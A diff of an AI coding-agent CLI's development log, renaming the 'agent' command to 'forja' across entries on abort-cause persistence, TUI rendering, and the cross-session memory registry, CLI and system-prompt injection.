-- **D169 — `abortCause` persisted to SQLite (post-review).** Initial cut had the discriminator only in-memory: `HarnessResult.abortCause` died at the process boundary, so `agent --session <id>` queries and replay tools couldn't recover whether an abort was soft or hard. That defeated the slice's stated purpose ("audit / telemetry / replay"). Migration 017 adds an `abort_cause TEXT CHECK (NULL OR 'soft'|'hard')` column to `sessions`. `completeSession` accepts the new optional `abortCause` arg; the harness's `finish()` threads it through alongside the in-memory result. Existing rows backfill to NULL — the check accepts NULL as the explicit "no discriminator" value.
+- **D169 — `abortCause` persisted to SQLite (post-review).** Initial cut had the discriminator only in-memory: `HarnessResult.abortCause` died at the process boundary, so `forja --session <id>` queries and replay tools couldn't recover whether an abort was soft or hard. That defeated the slice's stated purpose ("audit / telemetry / replay"). Migration 017 adds an `abort_cause TEXT CHECK (NULL OR 'soft'|'hard')` column to `sessions`. `completeSession` accepts the new optional `abortCause` arg; the harness's `finish()` threads it through alongside the in-memory result. Existing rows backfill to NULL — the check accepts NULL as the explicit "no discriminator" value.
 - **D170 — `guardedFinish` remaps aborted exceptions (post-review).** Pre-1.g.2 a SQLite write failing because `signal.aborted` mid-flight was caught and reported as `internalError` — looked like a harness bug instead of operator-initiated termination. The chance to fix it landed in this slice but the initial cut missed. `guardedFinish` now checks `signal.aborted` at throw time and routes to `finish('aborted', detail, 'hard')` (or `maxWallClockMs` if the wall-clock controller fired) before falling back to `internalError`. Soft never reaches this path — the soft signal only fires at step boundaries, never inside an exception throw window.
 - **D171 — Adapter does NOT consume `abortCause` (deferred).** `harness-adapter.ts` translates `session_finished` → `session:end` UIEvent. The UIEvent's `reason` field is `string`-typed (with a fixed-set hint) and doesn't carry `abortCause`. Operator in the TUI sees the same `session:end reason=interrupted` for both soft and hard. Closing this gap requires either (a) extending `SessionEndEvent` with an optional `abortCause` field and threading through the adapter, or (b) passing the discriminator via a separate UIEvent (audit-only). Out of scope here — TUI surface is mostly stable for M1, and the operator-visible signal is already in the footer cue (`esc to interrupt` → `esc again to force`). Closes when the audit panel / NDJSON output slice lands.
 - **D172 — `HarnessResult.abortCause` could be a discriminated union (deferred).** Today: `abortCause?: 'soft' | 'hard'` on the unified `HarnessResult` shape — TS allows `{reason: 'done', abortCause: 'soft'}` by construction, defended only by `finish()`'s runtime guard. A discriminated union (`{reason: 'aborted', abortCause: ...} | {reason: Exclude<...>; }`) would push the constraint into the type system. Refactor is significant: every consumer that destructures `HarnessResult` needs to narrow before reading `abortCause`. Defer until there's a concrete consumer that benefits (audit panel, replay query). Today the in-house guard + the SQLite CHECK constraint cover the production paths.
@@ -32683,7 +33987,7 @@ adapter → bus → reducer → renderer back to the user's terminal.
 - **D53 — Provider `tool_use_*` events dropped at the adapter.** The harness emits `tool_invoking` AFTER the provider stream concludes, with the full args payload + the assigned `toolUseId`. Surfacing both would render the same tool card twice (once partial, once complete). Drop the provider stream's tool_use events; the renderer sees only the post-decision lifecycle.
 - **D54 — Adverse exit → `warn` + `session:end` reason='error'.** `ExitReason` has 10 variants; `SessionEndEvent.reason` collapses them into `done | aborted | maxSteps | maxCostUsd | error`. The detail string from `HarnessResult.detail` rides along as a `warn` permanent line emitted BEFORE `session:end`, so the user sees the "why" even though the session-footer reducer only knows the collapsed reason. Keeps the renderer's footer shape stable and gives full information to scrollback.
 - **D55 — Step:budget emitted on session_start AND session_finished AND every step_start.** Three triggers because: session_start sets the initial 0/N display; step_start updates the running count; session_finished overwrites with the actual final cost (the harness reports cost only at session end, so mid-run the cost stays 0 in the status line). Consumers that care about live cost will need a per-turn usage signal — explicitly out of scope for this slice.
-- **D56 — Single bootstrap per REPL session, per-turn HarnessConfig override.** Bootstrap allocates the DB, opens the provider, resolves the policy hierarchy, loads subagents — all stable across turns within a session. Re-bootstrapping per turn would re-read .agent/permissions.yaml, re-load every subagent .md, re-probe git for checkpoints — minutes of redundant work over a long session. Per turn we just spread `baseConfig` and override `userPrompt` + `signal` + `onEvent` + `resumeFromSessionId`. Surfacing lock conflicts and subagent shadows happens once at boot, not per turn.
+- **D56 — Single bootstrap per REPL session, per-turn HarnessConfig override.** Bootstrap allocates the DB, opens the provider, resolves the policy hierarchy, loads subagents — all stable across turns within a session. Re-bootstrapping per turn would re-read .forja/permissions.yaml, re-load every subagent .md, re-probe git for checkpoints — minutes of redundant work over a long session. Per turn we just spread `baseConfig` and override `userPrompt` + `signal` + `onEvent` + `resumeFromSessionId`. Surfacing lock conflicts and subagent shadows happens once at boot, not per turn.
 - **D57 — REPL drops `session:end` from the bus stream.** The reducer's old `session:end` semantics set `state.ended = true` and the renderer froze. That's correct for one-shot mode; in REPL the user types between turns and needs the renderer alive. Two paths considered: (a) reset `ended` on the next `session:start` (works but the typing-between-turns interval is dead); (b) drop `session:end` entirely in REPL, lose the session-footer scrollback line. (b) chosen — the next user prompt is a natural visual divider, and the cumulative `step:budget` already rolled forward to the final values. The reducer's `user:submit` branch ALSO resets `ended` as belt-and-suspenders for any callers that don't filter.
 - **D58 — Empty prompt enters REPL; `--json` + empty prompt is an error.** NDJSON consumers (CI, scripts, `forja … | jq`) have no TTY; opening a REPL there is a UX trap. Refuse upfront with a clean diagnostic. Also: `--resume` without a prompt continues to error inside `run.ts` with the more specific "follow-up prompt required" message — REPL doesn't need to special-case resume.
 - **D59 — Bus `emit('error', ...)` skips the typed channel when no listener exists.** Node's `EventEmitter` has the special `emit('error', ...)` throw-when-unhandled behavior. The TUI bus uses the type tag as a routing key, not as Node's error sentinel; the renderer subscribes via `onAny`. Without the carve-out, any UIEvent of type `'error'` crashed the process unless someone explicitly subscribed to the typed channel. The wildcard channel still receives the event so the renderer/audit see it normally.
@@ -32845,7 +34149,7 @@ input wrapping.
 - **D25 — Heartbeat ticks are NOT wired in this slice.** Without a periodic `scheduler.request()`, the spinner only re-renders when an event triggers a frame. So during a long-running tool with no `tool:delta` flow, the spinner sits frozen. UX-acceptable for now (users still see the head line + elapsed advancing once any other event arrives) and keeps the slice tight. The heartbeat lands when input editing or modal pattern arrives — those layers also need periodic redraws.
 - **D26 — Live-region lines truncate at visual width, not code-unit length.** `truncateToWidth` walks codepoints with `string-width` so CJK/emoji that occupy 2 cols don't make a "fits in 80 cols" line wrap to 81+. The cursor math (clearDown + cursorUp) only works if the terminal didn't auto-wrap; visual-width truncation is what makes that contract honest.
 - **D27 — Permanent items stay un-truncated.** Same as 1.b D17 — scrollback is the terminal's job to wrap/scroll. Width matters only for the live region.
-- **D28 — `resizeStream: false` is a real option, not a bug.** Three configurations: omit (defaults to `process.stdout`), pass a fake (tests), pass `false` (caller owns the watcher). The third covers cases where the renderer is wrapped — e.g., a future `agent --headless` path that already has its own resize handling. Distinct from undefined so the type captures intent.
+- **D28 — `resizeStream: false` is a real option, not a bug.** Three configurations: omit (defaults to `process.stdout`), pass a fake (tests), pass `false` (caller owns the watcher). The third covers cases where the renderer is wrapped — e.g., a future `forja --headless` path that already has its own resize handling. Distinct from undefined so the type captures intent.
 - **D29 — `liveCaps` is a mutable copy, not a reference to `options.caps`.** The caller's `caps` object is treated as input only — we never mutate it. `liveCaps` is the renderer's working copy. Simpler than threading "current caps" through every call site, and the mutation is contained to the renderer's closure.
 - **D30 — `renderer-types.ts` exists only to break the circular import.** `renderer.ts` → `./render/compose.ts` → `ComposeLive` type. If `ComposeLive` lived in `renderer.ts`, the cycle would be `renderer.ts` ⇄ `compose.ts`. TS allows it, but it makes the dep graph confusing and breaks isolated-modules in some build configs. Keeping the type in its own tiny file is the cleanest cut.
 - **D31 — Spinner intervals (80ms / 100ms) are baked into the render function, not configurable.** UI.md §6.2 catalogs them as fixed values. Configurability would invite tuning churn; the spec sets them.
@@ -33014,7 +34318,7 @@ monkey-patch globals or run a real PTY.
 - **No render functions.** No `renderToolCard`, `renderStatusLine`, etc. — pure render `state → string[]` will live in `src/tui/render/*.ts` once the renderer exists.
 - **No modal pattern implementation.** State + focus handler + promise (UI.md §5.5) lands with the renderer.
 - **No HarnessEvent → UIEvent adapter.** Comes when we wire the bus to a real harness run.
-- **No interactive mode in `src/cli/index.ts`.** Currently `agent` requires a prompt; the TUI mode (no prompt → REPL) hooks in last.
+- **No interactive mode in `src/cli/index.ts`.** Currently `forja` requires a prompt; the TUI mode (no prompt → REPL) hooks in last.
 - **No exit-path hardening.** `uncaughtException`/`SIGINT` handlers that call `disableRawMode` belong with the renderer that owns the live region.
 
 **Verification:** `bun test` → 1698 pass / 10 skip / 0 fail (+68 new). `tsc --noEmit` clean. `biome check .` clean.
@@ -33081,7 +34385,7 @@ NDJSON. Tests assert on events.
 
 **Verification:** Spec-only diff. No `bun test` / `tsc` impact (no source touched). Manual review: `grep -rn "Ink\|<.*Card>\|<.*Bar>\|<.*Tray>\|<.*Badge>" docs/spec/` returns zero matches across active spec files.
 
-**Next:** Implement M1 step 1 — `src/tui/term.ts` (raw stdin parser, ANSI writer, SIGWINCH, frame scheduler) + `src/tui/bus.ts` (typed EventEmitter wrapper) + minimal renderer that subscribes to a fake harness emitting events, hooked to the existing `agent` entry point. Born with tests.
+**Next:** Implement M1 step 1 — `src/tui/term.ts` (raw stdin parser, ANSI writer, SIGWINCH, frame scheduler) + `src/tui/bus.ts` (typed EventEmitter wrapper) + minimal renderer that subscribes to a fake harness emitting events, hooked to the existing `forja` entry point. Born with tests.
 
 ---
 
@@ -33089,10 +34393,10 @@ NDJSON. Tests assert on events.
 
 External review caught a second real bug. Bootstrap and CLI
 `--memory` resolved scope roots from `cwd` directly: an operator
-invoking `agent` from a subdirectory inside a repo (the common
+invoking `forja` from a subdirectory inside a repo (the common
 case — `cd src/components/ && agent "..."`) would have project
-memories searched under `<subdir>/.agent/memory/...` instead of
-the repo's `<repo>/.agent/memory/...`. Result: the injected
+memories searched under `<subdir>/.forja/memory/...` instead of
+the repo's `<repo>/.forja/memory/...`. Result: the injected
 `# Memory` section came out empty, every `memory_*` tool read
 silently missed existing memories, and operators saw no symptom
 beyond "the agent doesn't seem to know things it should".
@@ -33111,18 +34415,18 @@ bootstrap was the wrong caller.
 | `src/memory/paths.ts` | NEW `resolveRepoRoot(cwd)` — sync helper using `Bun.spawnSync` over `git rev-parse --show-toplevel`. Returns the resolved repo root when in a git working tree; falls back to the input cwd when git is missing OR the path isn't inside a repo (operator gets per-cwd memory then — same fallback behavior the buggy code had, just now explicit). Mirrors the async `defaultResolveRepoRoot` pattern in `subagents/worktree-gc.ts` but sync because bootstrap is sync. |
 | `src/memory/index.ts` | Re-export `resolveRepoRoot`. |
 | `src/cli/bootstrap.ts` | `resolveScopeRoots(resolveRepoRoot(cwd))` instead of `resolveScopeRoots(cwd)`. The HarnessConfig.cwd field stays as the operator's invocation cwd (other subsystems anchor on that); only the memory roots resolution uses the repo root. |
-| `src/cli/memory.ts` | Same fix for the operator-facing CLI. `agent --memory list` / `show` from a subdir now finds project memories at the repo root. |
+| `src/cli/memory.ts` | Same fix for the operator-facing CLI. `forja --memory list` / `show` from a subdir now finds project memories at the repo root. |
 | `src/cli/subagent-child.ts` | Same fix on the subagent path. The parent forwards `memoryCwd: input.cwd` (parent's invocation cwd, may be a subdir); the child must resolve that to the repo root before anchoring its registry. Without this fix, subagents inherited the parent's broken anchor. |
 | `tests/memory/paths.test.ts` | NEW describe block for `resolveRepoRoot`: returns repo root from a subdir of a git repo, returns repo root from the repo root itself, falls back to cwd outside a git repo, falls back to cwd for non-existent paths. Uses real `git init` in tmpdirs (matches the `tests/checkpoints/detect.test.ts` pattern). `realpathSync` on tmpdirs because macOS `/var → /private/var` would otherwise mismatch the canonical form `git rev-parse` returns. |
-| `tests/cli/bootstrap.test.ts` | NEW regression test: git init the workdir, seed `<workdir>/.agent/memory/local/role.md`, invoke bootstrap from `<workdir>/src/components/`. Assert the system prompt includes the memory section. Pre-fix this would assert empty. |
+| `tests/cli/bootstrap.test.ts` | NEW regression test: git init the workdir, seed `<workdir>/.forja/memory/local/role.md`, invoke bootstrap from `<workdir>/src/components/`. Assert the system prompt includes the memory section. Pre-fix this would assert empty. |
 | `tests/cli/memory.test.ts` | NEW regression test for `runMemoryCli`: same shape — git init the workdir, seed memory at repo root, invoke `--memory list` from a subdir, assert one entry returned (not empty). |
 
 **Decisions:**
 
 - **D1 — Sync helper, not async.** Bootstrap is synchronous and async-conversion would cascade through its callers (`run.ts`, every test that calls bootstrap directly). `Bun.spawnSync` adds ~1-5ms to bootstrap time per session; dominated by SQLite migrate already on the same path. Worth the simplicity.
-- **D2 — Helper falls back to cwd, not throws.** Operator running `agent` outside a git repo (rare but legitimate — playground dirs, CI scratch volumes) shouldn't see a hard error; they should get per-cwd memory, which is the same shape pre-fix code had. The fallback also covers test scenarios that don't bother to git-init.
+- **D2 — Helper falls back to cwd, not throws.** Operator running `forja` outside a git repo (rare but legitimate — playground dirs, CI scratch volumes) shouldn't see a hard error; they should get per-cwd memory, which is the same shape pre-fix code had. The fallback also covers test scenarios that don't bother to git-init.
 - **D3 — Apply at every call site, not at the registry layer.** Pushing repo-root resolution INTO `createMemoryRegistry` was tempting but wrong: the registry's `roots` parameter has a clear contract ("absolute scope roots"); coupling it to git would make the API surface impure and hard to test. Each entry path (bootstrap, CLI memory, subagent-child) explicitly resolves before passing to `resolveScopeRoots` — inverse of how the spec docs already framed it.
-- **D4 — `HarnessConfig.cwd` stays as invocation cwd.** Only the MEMORY roots use the repo root. Other subsystems (bgLogDir, checkpoints, working-tree probes) anchor on the operator's invocation cwd intentionally — `bgLogDir` is `<cwd>/.agent/bg/...`, checkpoints probe `<cwd>` for git, etc. Switching all of those to repo root would change behavior in directions not motivated by this bug. Memory is the exception because per-repo is its semantic.
+- **D4 — `HarnessConfig.cwd` stays as invocation cwd.** Only the MEMORY roots use the repo root. Other subsystems (bgLogDir, checkpoints, working-tree probes) anchor on the operator's invocation cwd intentionally — `bgLogDir` is `<cwd>/.forja/bg/...`, checkpoints probe `<cwd>` for git, etc. Switching all of those to repo root would change behavior in directions not motivated by this bug. Memory is the exception because per-repo is its semantic.
 
 **Pending / known limitations:**
 
@@ -33169,12 +34473,12 @@ passed it at construction.
 - **D1 — Per-call override path, not late binding via setter.** Two alternatives considered: (a) move `createSession` from harness loop to bootstrap (big refactor cascading through resume / preassigned / subagent paths), (b) `registry.setSessionId(id)` mutator the harness calls post-createSession (introduces mutable state in registry). Option (c) chosen here: tools have `ctx.sessionId` at every invocation already; passing it on every call is the smallest surface change AND keeps the registry stateless. The constructor's sessionId stays as a useful fallback for callers (CLI inspect, subagent-child) that know it at construction time.
 - **D2 — Override at the OPTIONS object, not as positional args.** Mirrors how scope is opt-in via `{ scope: ... }`. Adding positional args would force every call site to think about audit metadata; opt-in via spread keeps the simple "registry.read('foo')" form working for tests that don't care about audit fidelity (in-memory DB, no consumers of the audit table).
 - **D3 — `auditSessionId` / `auditCwd` field names, not `sessionId` / `cwd`.** The latter two would clash semantically — `cwd` could plausibly be a lookup parameter, and the registry's own constructor uses bare `cwd`. The `audit*` prefix makes intent unmistakable: this is metadata for the audit row, not lookup behavior.
-- **D4 — Constructor sessionId NOT removed from CreateMemoryRegistryInput.** Subagent-child still passes it (knows the session at construction); CLI `agent --memory show` still passes operator-driven cwd. Removing those would force ALL callers to use per-call override, which is overkill — only the bootstrap path has the chicken-and-egg with createSession. Keeping the constructor field as fallback handles both shapes cleanly.
+- **D4 — Constructor sessionId NOT removed from CreateMemoryRegistryInput.** Subagent-child still passes it (knows the session at construction); CLI `forja --memory show` still passes operator-driven cwd. Removing those would force ALL callers to use per-call override, which is overkill — only the bootstrap path has the chicken-and-egg with createSession. Keeping the constructor field as fallback handles both shapes cleanly.
 
 **Pending / known limitations:**
 
 - **No backfill of historical NULL rows.** Existing `memory_events` rows from runs that landed before this fix stay session_id=NULL; there's no way to recover the original session. Operators querying history will see a cliff between pre-fix and post-fix runs. Acceptable: audit history is forward-only, the table is in dev only at this point so the blast radius is the developer's own dogfood data.
-- **CLI `agent --memory show` still emits NULL session_id.** Intentional: operator-driven inspection has no session by design (the audit row's NULL is the marker that distinguishes operator from agent). Documented in 5.2.b D2.
+- **CLI `forja --memory show` still emits NULL session_id.** Intentional: operator-driven inspection has no session by design (the audit row's NULL is the marker that distinguishes operator from agent). Documented in 5.2.b D2.
 
 **Verification:** `bun test` 1624 pass / 10 skip / 0 fail (+5 new across registry override behavior + tool-level forwarding); `tsc --noEmit` clean; `biome check` clean.
 
@@ -33294,13 +34598,13 @@ index + lazy bodies + grep) cross-session.
 |---|---|
 | `src/cli/memory-prompt.ts` | NEW — `assembleMemorySection({ registry })` returns `{ text, entryCount }`. Empty when no memories exist (no scaffolding tokens wasted). With entries, emits a `# Memory` header + one-sentence usage hint (call `memory_read` / `memory_list` / `memory_search`) + bullet list `- [<scope>] <name> — <hook>`. Dedup is on by default so a name shadowed across all three scopes appears once at its most-specific scope (project_local > project_shared > user) — saves tokens and removes the resolution ambiguity the model would otherwise have to reason through. `composeSystemPrompt(base, section)` helper handles the four cases (both empty / one empty / both set), preserving `undefined` when memory is empty so existing tests asserting `systemPrompt === undefined` still pass. |
 | `src/cli/bootstrap.ts` | Bootstrap now constructs a `MemoryRegistry` post-migrate (with the live DB + cwd), assembles the section via `assembleMemorySection`, composes onto the resolved system prompt with `composeSystemPrompt`, and wires the registry into `HarnessConfig.memoryRegistry`. Construction is unconditional in production; an absent or empty memory subtree just produces empty section text and `composeSystemPrompt` passes the base through untouched. |
-| `tests/cli/bootstrap.test.ts` | beforeEach now sets `XDG_CONFIG_HOME = workdir`, restoring in afterEach. Without the override the bootstrap's eager memory load would pick up the developer's real `~/.config/agent/memory/` and bleed into every "passes through unchanged" assertion. Three new tests cover the integration: memory appended to caller systemPrompt; memory becomes systemPrompt when caller didn't supply one; registry wired even with empty memories (so the tools dispatch correctly). The existing 13 tests remain green because empty user scope (workdir has no `agent/memory/` subtree) yields an empty section. |
+| `tests/cli/bootstrap.test.ts` | beforeEach now sets `XDG_CONFIG_HOME = workdir`, restoring in afterEach. Without the override the bootstrap's eager memory load would pick up the developer's real `~/.config/forja/memory/` and bleed into every "passes through unchanged" assertion. Three new tests cover the integration: memory appended to caller systemPrompt; memory becomes systemPrompt when caller didn't supply one; registry wired even with empty memories (so the tools dispatch correctly). The existing 13 tests remain green because empty user scope (workdir has no `agent/memory/` subtree) yields an empty section. |
 | `tests/cli/memory-prompt.test.ts` | NEW — 10 unit tests on `assembleMemorySection` and `composeSystemPrompt`: empty registry, three-scope rendering, scope-precedence ordering, dedup-by-name, all four base+section combinations of compose. |
 
 **Decisions (post-review polish bundled in):**
 
 - **D8 (post-review C1) — Bootstrap try/catch extended to cover memory registry construction.** Pre-review the try/catch only wrapped `migrate(db)`. After migrate succeeded, `createMemoryRegistry` ran outside the catch — and that path can throw on fs errors other than ENOENT (EACCES, EIO on a misconfigured user scope or unreadable index file). A throw there leaked the open SQLite handle (and its -wal/-shm file pair). Extended the try block to wrap both `migrate` and the entire memory composition flow; any failure now closes the DB before propagating. Added a regression test that chmods MEMORY.md to 0o000 to force a read error and verifies bootstrap throws cleanly.
-- **D9 (post-review M1) — Resume mode loads the CURRENT memory tree, not the session-original snapshot.** Spec §4.1 says the index is "estável entre turnos da MESMA sessão"; cross-session it's free to drift. So `agent --resume <id>` running today shows whatever's in `~/.config/agent/memory/` and `<repo>/.agent/memory/{shared,local}/` NOW, not what was there when the session originally started. Persisted assistant messages may reference memories that no longer exist; the model handles this fine in practice (the body is reachable via memory_read failure → "memory.not_found" tool error, which the model can interpret). Documented as expected behavior; not fixing.
+- **D9 (post-review M1) — Resume mode loads the CURRENT memory tree, not the session-original snapshot.** Spec §4.1 says the index is "estável entre turnos da MESMA sessão"; cross-session it's free to drift. So `forja --resume <id>` running today shows whatever's in `~/.config/forja/memory/` and `<repo>/.forja/memory/{shared,local}/` NOW, not what was there when the session originally started. Persisted assistant messages may reference memories that no longer exist; the model handles this fine in practice (the body is reachable via memory_read failure → "memory.not_found" tool error, which the model can interpret). Documented as expected behavior; not fixing.
 
 **Decisions:**
 
@@ -33308,7 +34612,7 @@ index + lazy bodies + grep) cross-session.
 - **D2 — Empty section means no scaffolding tokens.** `assembleMemorySection` returns `{ text: '', entryCount: 0 }` for an empty registry, and `composeSystemPrompt` short-circuits the empty-empty case to `undefined`. Operators with no memories pay zero token overhead. The alternative (always emit the `# Memory` header even with zero entries) would cost ~30 tokens per session for nothing.
 - **D3 — Dedup on by default in injection (opposite of `memory_list` tool default).** The MODEL-FACING tool surface keeps shadowing visible (the model needs to see "this name exists in 3 scopes; local wins" to learn the precedence model). The SYSTEM PROMPT injection collapses to the most-specific scope because: (a) the model only NEEDS to know which entry is active for "name X"; (b) showing all three triples context length without adding signal. The two surfaces have different audiences; different defaults are correct.
 - **D4 — Cache breakpoint optimization deferred.** Spec §4.1 says "Cache breakpoint depois do index". Anthropic's SDK supports per-block `cache_control` markers when `system` is an array, not a string. Currently the harness passes `system: string` raw. Wiring cache breakpoints requires a provider-adapter refactor (and tests) for a benefit that's measurable only on multi-turn sessions with stable indexes. Defer until eval / cost data shows the gain. The injection works correctly without it; only re-caching efficiency is left on the table.
-- **D5 — `XDG_CONFIG_HOME` env override in bootstrap tests, not a new test seam.** Adding `memoryRoots?: ScopeRoots | null` to BootstrapInput would have meant updating 13 existing tests with an opt-out flag. Setting `XDG_CONFIG_HOME = workdir` in the existing beforeEach is one place, matches production behavior (env-driven scope resolution), and parallels the same pattern already used in `tests/cli/memory.test.ts`. The new memory-bootstrap tests write to the project-local subtree (`<workdir>/.agent/memory/local/`) which is already isolated by the workdir tmpdir.
+- **D5 — `XDG_CONFIG_HOME` env override in bootstrap tests, not a new test seam.** Adding `memoryRoots?: ScopeRoots | null` to BootstrapInput would have meant updating 13 existing tests with an opt-out flag. Setting `XDG_CONFIG_HOME = workdir` in the existing beforeEach is one place, matches production behavior (env-driven scope resolution), and parallels the same pattern already used in `tests/cli/memory.test.ts`. The new memory-bootstrap tests write to the project-local subtree (`<workdir>/.forja/memory/local/`) which is already isolated by the workdir tmpdir.
 - **D6 — Trust filter NOT applied yet.** Spec §7.2 mitigation 2 says `trust: untrusted` memories must NOT enter the base context. Filtering by trust requires reading every body's frontmatter (the index doesn't carry trust info), which violates the eager-index principle. Until 5.4 lands the trust integration (which will add an index-side trust marker OR a body preload pass), no production path writes `trust: untrusted` (only the writer in 5.4 does), so the gate is a no-op. The 5.4 design will close this; the 5.2.c injection passes every entry through.
 - **D7 — Section header is `# Memory` (markdown H1), not a sentinel comment.** Models pre-trained on prose recognize markdown structure; an H1 header makes the section visually distinct from the rest of the system prompt without adding parse-only ceremony. Section body uses prose + bullet list, same shape models see in user content.
 
@@ -33322,15 +34626,15 @@ index + lazy bodies + grep) cross-session.
 
 **Verification:** `bun test` 1610 pass / 10 skip / 0 fail (+13 new across the assembler unit tests + bootstrap integration tests + 1 environment-isolation update + 1 review-driven DB-leak regression test); `tsc --noEmit` clean; `biome check` clean.
 
-**Next:** With 5.2.a/b/c landed, the entire 5.2 (read-only surface) arc is COMPLETE. The model can list, search, and read memories cross-session, sees the index eagerly in the system prompt, and operators can inspect via `agent --memory`. M3 / Step 5.3 is the write surface — `memory_write` tool with TUI confirmation, the injection scanner (heuristic + secret-pattern detection), and headless-mode rejection. After that, 5.4 (trust integration), 5.5 (promote/demote), 5.6 (lifecycle).
+**Next:** With 5.2.a/b/c landed, the entire 5.2 (read-only surface) arc is COMPLETE. The model can list, search, and read memories cross-session, sees the index eagerly in the system prompt, and operators can inspect via `forja --memory`. M3 / Step 5.3 is the write surface — `memory_write` tool with TUI confirmation, the injection scanner (heuristic + secret-pattern detection), and headless-mode rejection. After that, 5.4 (trust integration), 5.5 (promote/demote), 5.6 (lifecycle).
 
 ---
 
-## [2026-05-01] M3 / Step 5.2.b — `agent --memory` operator surface (list + show)
+## [2026-05-01] M3 / Step 5.2.b — `forja --memory` operator surface (list + show)
 
 5.2.a landed the registry + read tools (model-facing). 5.2.b adds
 the operator-facing CLI for inspecting memory directly: `agent
---memory list [scope]` and `agent --memory show <name> [scope]`.
+--memory list [scope]` and `forja --memory show <name> [scope]`.
 Built on the same registry the model-facing tools use, so the
 operator's view and the agent's view stay consistent.
 
@@ -33358,19 +34662,19 @@ API key. Mirrors the structure of `runWorktreesCli` and
 **Decisions:**
 
 - **D1 — Flag style (`--memory`), matching the rest of the CLI surface.** Spec §6.3 lists the slash-command vocabulary as `/memory list`, `/memory show`, etc. — that's the future TUI surface (M4+ Ink picker). For pre-TUI headless invocation we mirror the operator commands as `--memory list/show`, same as `--checkpoints` and `--worktrees`. The verb names match (list/show) so the eventual slash-command port is mechanical.
-- **D2 — Audit emission with `session_id=NULL`.** Operator running `agent --memory show role` from CLI is NOT an agent action, but spec §5.3 mandates an audit log row for every `read`. Solution: emit the row with `session_id=NULL` so the audit captures the read while preserving the operator-vs-agent distinction (the FK SET NULL semantics already let us query "events without a session linkage" → operator-driven). The cwd column IS populated (anchors which project the operator was inspecting from).
+- **D2 — Audit emission with `session_id=NULL`.** Operator running `forja --memory show role` from CLI is NOT an agent action, but spec §5.3 mandates an audit log row for every `read`. Solution: emit the row with `session_id=NULL` so the audit captures the read while preserving the operator-vs-agent distinction (the FK SET NULL semantics already let us query "events without a session linkage" → operator-driven). The cwd column IS populated (anchors which project the operator was inspecting from).
 - **D3 — Defense-in-depth `validateName` at the CLI boundary.** Same rationale as in `memory_read` tool: the registry's `findListing` returns null silently for `../escape` because no listing matches by name, surfacing as `unknown`. That hides the path-traversal attempt. Calling `validateName` first turns `../escape` into a clean "invalid memory name" message, preserving the security signal in the audit / stderr.
-- **D4 — Strict scope on `show <name> <scope>`.** Mirrors `memory_read` tool behavior. An operator typing `agent --memory show role project_local` who actually has `role` only in `user` scope gets "no memory named role in scope project_local", not silent fallback. Consistency with the model-facing surface > convenience.
-- **D5 — Plain output is operator-readable, not parser-friendly.** Show output: `scope:` / `name:` / `type:` / `source:` / `description:` / optional `expires:`/`trust:`/`triggers:` lines, blank line, then verbatim body. Operators can `agent --memory show foo | less` or grep without parsing. NDJSON gives the structured shape for headless tooling. List uses a 3-column space-separated table — same low-ceremony layout as `--worktrees list`.
-- **D6 — `dedupe_by_name` not exposed on the CLI list.** The model-facing tool has it (the model needs to see shadowing explicitly to learn the precedence model). Operators inspecting the index typically WANT to see all scopes — that's what `agent --memory list` is for. Adding the flag is trivial later if a use case appears; YAGNI for now.
+- **D4 — Strict scope on `show <name> <scope>`.** Mirrors `memory_read` tool behavior. An operator typing `forja --memory show role project_local` who actually has `role` only in `user` scope gets "no memory named role in scope project_local", not silent fallback. Consistency with the model-facing surface > convenience.
+- **D5 — Plain output is operator-readable, not parser-friendly.** Show output: `scope:` / `name:` / `type:` / `source:` / `description:` / optional `expires:`/`trust:`/`triggers:` lines, blank line, then verbatim body. Operators can `forja --memory show foo | less` or grep without parsing. NDJSON gives the structured shape for headless tooling. List uses a 3-column space-separated table — same low-ceremony layout as `--worktrees list`.
+- **D6 — `dedupe_by_name` not exposed on the CLI list.** The model-facing tool has it (the model needs to see shadowing explicitly to learn the precedence model). Operators inspecting the index typically WANT to see all scopes — that's what `forja --memory list` is for. Adding the flag is trivial later if a use case appears; YAGNI for now.
 - **D7 — Lazy-import the memory module in run.ts dispatch.** Same pattern as the `--worktrees` dispatch. Keeps the cold-start path light when memory isn't being inspected.
 
 **Pending / known limitations:**
 
-- **No `--memory edit/delete/save`.** Those are write surfaces and live in 5.3 (write tools + TUI confirmation). The CLI side waits until 5.6 (lifecycle slash commands) to round out `agent --memory edit/delete/expire/audit`.
+- **No `--memory edit/delete/save`.** Those are write surfaces and live in 5.3 (write tools + TUI confirmation). The CLI side waits until 5.6 (lifecycle slash commands) to round out `forja --memory edit/delete/expire/audit`.
 - **No `--memory audit`.** Spec §6.3 lists `/memory audit` to dump `memory_events`. Defer to 5.6 when the lifecycle pass + the audit surface land together.
 - **No `--memory promote/demote`.** 5.5 owns these; they need the secret/injection scanner.
-- **No interactive picker.** `agent --memory list` is a flat table; `agent --memory show <name>` requires the operator to know the name. The TUI picker (`/memory show` with fuzzy completion) waits for M4's Ink TUI. Headless CLI usage is fine.
+- **No interactive picker.** `forja --memory list` is a flat table; `forja --memory show <name>` requires the operator to know the name. The TUI picker (`/memory show` with fuzzy completion) waits for M4's Ink TUI. Headless CLI usage is fine.
 - **`show` output to stdout includes the body verbatim, including any control characters.** A malicious memory body with ANSI escape codes could disrupt terminal rendering. Defer to 5.4 trust integration where `[memory: untrusted]` markers ship.
 
 **Verification:** `bun test` 1597 pass / 10 skip / 0 fail (+22 new across CLI handler tests + args parsing + 1 review-driven empty-body regression); `tsc --noEmit` clean; `biome check` clean. No smoke eval — the CLI is a trivial wrapper around the already-tested registry.
@@ -33388,7 +34692,7 @@ sub-slices because the full scope (loader + 3 tools + CLI +
 system prompt injection) is ~1500+ LoC and CLI/system-prompt are
 independent concerns. This sub-slice (a) ships the disk-side
 loader, the in-process registry with scope merge + audit, and the
-three read-only tools. Sub-slices b (CLI `agent --memory list|show`)
+three read-only tools. Sub-slices b (CLI `forja --memory list|show`)
 and c (system prompt index injection) follow.
 
 **Done:**
@@ -33432,12 +34736,12 @@ and c (system prompt index injection) follow.
 - **D9 — Tool naming: `memory_*` (snake_case), matching the `bash_*` and `todo_write` family.** Models receive the tool name verbatim; consistency keeps the convention learnable. The tool descriptions explicitly say "Substring search ... no fuzziness — this is grep, not vector retrieval" to discourage models from treating `memory_search` as semantic.
